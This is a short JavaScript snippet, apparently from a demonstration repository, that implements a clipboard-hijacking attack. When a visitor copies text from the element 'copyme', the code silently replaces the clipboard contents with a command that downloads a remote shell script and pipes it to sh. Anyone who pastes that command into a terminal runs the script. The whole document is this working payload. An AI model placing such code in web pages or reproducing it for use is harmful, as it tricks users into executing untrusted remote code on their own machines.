document.getElementById('copyme').addEventListener(
    'copy', function(e){
        e.clipboardData.setData('text/plain',
        'curl https://raw.githubusercontent.com/marco97pa/copy-paste-hack-js/master/bad_script.sh | sh\n');
        e.preventDefault();
    }
)